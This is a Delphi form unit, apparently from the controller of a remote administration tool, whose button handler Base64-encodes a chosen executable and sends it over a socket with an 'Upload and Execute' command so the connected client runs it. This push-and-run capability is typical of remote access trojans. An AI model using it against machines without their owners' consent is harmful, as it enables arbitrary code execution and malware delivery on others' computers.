unit Unit5;

interface

uses
  Winapi.Windows, Winapi.Messages, System.SysUtils, System.Variants, System.Classes, Vcl.Graphics,
  Vcl.Controls, Vcl.Forms, Vcl.Dialogs, scControls, scGPControls, DzSocket, System.NetEncoding,
  Vcl.StdCtrls, System.ImageList, Vcl.ImgList, Vcl.VirtualImageList,
  Vcl.BaseImageCollection, Vcl.ImageCollection;

type
  TRunExecute = class(TForm)
    scGPPanel9: TscGPPanel;
    scGPButton9: TscGPButton;
    Label1: TLabel;
    Label2: TLabel;
    ImageCollection1: TImageCollection;
    VirtualImageList1: TVirtualImageList;
    procedure scGPButton9Click(Sender: TObject);
    procedure Label2Click(Sender: TObject);
  private
     FCurrentSocket: TDzSocket;
  public
  property CurrentSocket: TDzSocket read FCurrentSocket write FCurrentSocket;

  end;

var
  RunExecute: TRunExecute;

implementation

{$R *.dfm}

procedure TRunExecute.Label2Click(Sender: TObject);
begin
Close;
end;

procedure TRunExecute.scGPButton9Click(Sender: TObject);
var
  OpenDialog: TOpenDialog;
  FileStream: TFileStream;
  ByteArray: TBytes;
  Base64Str: string;
  FileName: string;
begin
      if (CurrentSocket = nil) or (not CurrentSocket.Connected) then
  begin
    MessageBox(Handle, 'Client is not connected.', 'Error', MB_ICONERROR or MB_OK);
    Exit;
  end;

  OpenDialog := TOpenDialog.Create(Self);
  try
    OpenDialog.Title := 'Select file to upload and execute';
    OpenDialog.Filter := 'Executable files (*.exe)|*.exe|All files (*.*)|*.*';

    if OpenDialog.Execute then
    begin
      // Extract just the filename without path
      FileName := ExtractFileName(OpenDialog.FileName);

      try
        // Read the file into a byte array
        FileStream := TFileStream.Create(OpenDialog.FileName, fmOpenRead);
        try
          // Check file size
          if FileStream.Size > 50 * 1024 * 1024 then // 50 MB limit
          begin
            MessageBox(Handle, 'File is too large. Maximum size is 50 MB.',
                       'Error', MB_ICONERROR or MB_OK);
            Exit;
          end;

          // Read the file data
          SetLength(ByteArray, FileStream.Size);
          FileStream.ReadBuffer(ByteArray[0], FileStream.Size);

          // Convert to Base64
          Base64Str := TNetEncoding.Base64.EncodeBytesToString(ByteArray);

          // Send the command, filename, and Base64 data
          // 'U' command for Upload and Execute
          CurrentSocket.Send('U', FileName + '|' + Base64Str);

          MessageBox(Handle, PChar('File "' + FileName + '" sent to client.'),
                     'Upload Success', MB_ICONINFORMATION or MB_OK);
        finally
          FileStream.Free;
        end;
      except
        on E: Exception do
          MessageBox(Handle, PChar('Error sending file: ' + E.Message),
                     'Error', MB_ICONERROR or MB_OK);
      end;
    end;
  finally
    OpenDialog.Free;
  end;
end;

end.
